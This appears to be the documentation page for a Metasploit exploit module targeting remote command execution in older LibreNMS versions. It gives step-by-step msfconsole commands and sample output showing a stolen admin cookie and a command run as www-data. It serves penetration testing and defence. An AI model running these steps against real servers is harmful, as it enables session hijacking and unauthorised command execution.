[LibreNMS](http://www.librenms.org) is Community-based GPL-licensed network monitoring system 

## Vulnerable Application

You can get the application on its [github](https://github.com/librenms/librenms),
just make sure to get a version older than
[1205f12f10a87f50a9a9127ab3caea861bff91b9](https://github.com/librenms/librenms/commit/1205f12f10a87f50a9a9127ab3caea861bff91b9)

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: `use exploit/multi/http/librenms_rce`
  4. Do: `set rport port`
  5. Do: `set rhost ip`
  5. Do: `set cmd id`
  6. Do: `exploit`
```
 msf exploit(librenms_rce) > run
[*] Getting admin cookie...
[*] Got admin cookie: PHPSESSID=nmvg7q21egmrbg2enf27tjplt4;
[*] Result of the command:
uid=33(www-data) gid=33(www-data) groups=33(www-data),996(librenms)
[*] Exploit completed, but no session was created.
msf exploit(librenms_rce) > 
```
  9. You should get the admin cookie, and the result of your command.

## Options

  **TARGETURI**

  TARGETURI by default is `/`, which is the common path for LibreNMS.
  
## Demonstration

```
msf > use multi/http/librenms_rce
msf exploit(librenms_rce) > set cmd id
cmd => id
msf exploit(librenms_rce) > set RHOST 192.168.0.18
RHOST => 192.168.0.18
msf exploit(librenms_rce) > set payload cmd/unix/generic 
payload => cmd/unix/generic
msf exploit(librenms_rce) > run

[*] Getting admin cookie...
[*] Got admin cookie: PHPSESSID=nmvg7q21egmrbg2enf27tjplt4;
[*] Result of the command:
uid=33(www-data) gid=33(www-data) groups=33(www-data),996(librenms)
[*] Exploit completed, but no session was created.
msf exploit(librenms_rce) > 
```
